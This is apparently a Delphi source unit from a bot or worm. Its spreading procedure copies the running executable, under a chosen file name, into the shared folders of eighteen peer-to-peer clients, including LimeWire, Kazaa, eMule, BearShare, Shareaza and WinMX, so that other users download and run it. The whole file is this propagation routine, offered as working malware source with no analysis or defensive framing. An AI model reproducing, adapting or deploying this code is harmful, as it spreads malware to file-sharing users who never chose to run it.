unit p2pspread;

interface

uses Windows, functions, KOL, strings;



procedure Spreadp2p(FileName: String);

implementation
uses BOT;



procedure InjectLimeWire(FileName: String);
var progdir: String;
begin
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + P2PPaths[1];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + P2PPaths[1];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
end;

procedure InjectEdonkey2k(FileName: String);
var progdir: String;
begin
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + P2PPaths[2];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + P2PPaths[3];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + P2PPaths[4];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
end;

procedure InjectKazaa(FileName: String);
var progdir: String;
begin
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir[1] + progdir[2] + progdir[3];
  progdir := progdir + P2PPaths[5];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + P2PPaths[5];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + P2PPaths[6];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + P2PPaths[6];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + P2PPaths[7];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + P2PPaths[7];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
end;

procedure InjectEmule(FileName: String);
var progdir: String;
begin
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + P2PPaths[8];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + P2PPaths[9];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
end;

procedure InjectDownload(FileName: String);
var progdir: String;
begin
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir[1] + progdir[2] + progdir[3];
  progdir := progdir + P2PPaths[10];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + P2PPaths[10];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
    progdir := Functions.Get_Prog_Dir;
  progdir := progdir[1] + progdir[2] + progdir[3];
  progdir := progdir + P2PPaths[10] + 's';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + P2PPaths[10] + 's';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
    progdir := Functions.Get_Prog_Dir;
  progdir := progdir[1] + progdir[2] + progdir[3];
  progdir := progdir + P2PPaths[11];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + P2PPaths[11];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
    progdir := Functions.Get_Prog_Dir;
  progdir := progdir[1] + progdir[2] + progdir[3];
  progdir := progdir + P2PPaths[9];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + P2PPaths[9];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
    progdir := Functions.Get_Prog_Dir;
  progdir := progdir[1] + progdir[2] + progdir[3];
  progdir := progdir + P2PPaths[12];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + P2PPaths[12];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
end;

procedure InjectKMD(FileName: String);
var progdir: String;
begin
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + P2PPaths[13];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + P2PPaths[13];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
end;

procedure InjectMorpheus(FileName: String);
var progdir: String;
begin
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + P2PPaths[14];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + P2PPaths[14];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
end;

procedure InjectBearShare(FileName: String);
var progdir: String;
begin
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + P2PPaths[15];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + P2PPaths[15];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir +P2PPaths[16];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
end;

procedure InjectAppleJuice(FileName: String);
var progdir: String;
begin
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + P2PPaths[17];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + P2PPaths[17];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
end;

procedure InjectGnucleus(FileName: String);
var progdir: String;
begin
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + P2PPaths[18];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + P2PPaths[18];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
end;

procedure InjectGrokster(FileName: String);
var progdir: String;
begin
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + P2PPaths[19];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + P2PPaths[19];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
end;


procedure InjectOvernet(FileName: String);
var progdir: String;
begin
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + P2PPaths[20];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + P2PPaths[20];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
end;

procedure InjectShareaza(FileName: String);
var progdir: String;
begin
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + P2PPaths[21];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + P2PPaths[21];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
end;

procedure InjectSwaptor(FileName: String);
var progdir: String;
begin
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + P2PPaths[22];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + P2PPaths[22];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
end;


procedure InjectWinMX(FileName: String);
var progdir: String;
begin
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + P2PPaths[23];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + P2PPaths[23];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
end;


procedure InjectTesla(FileName: String);
var progdir: String;
begin
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + P2PPaths[24];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + P2PPaths[24];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
end;

procedure InjectXoloX(FileName: String);
var progdir: String;
begin
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + P2PPaths[25];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + P2PPaths[25];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
end;

procedure InjectRapigator(FileName: String);
var progdir: String;
begin
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + P2PPaths[26];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + P2PPaths[26];
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
end;




procedure Spreadp2p(FileName: String);
begin
  InjectLimeWire(FileName);
  InjectEdonkey2k(FileName);
  InjectKazaa(FileName);
  InjectEmule(FileName);
  InjectDownload(FileName);
  InjectKMD(FileName);
  InjectMorpheus(FileName);
  InjectBearShare(FileName);
  InjectAppleJuice(FileName);
  InjectGnucleus(FileName);
  InjectGrokster(FileName);
  InjectOvernet(FileName);
  InjectShareaza(FileName);
  InjectSwaptor(FileName);
  InjectWinMX(FileName);
  InjectTesla(FileName);
  InjectXoloX(FileName);
  InjectRapigator(FileName);
end;


end.
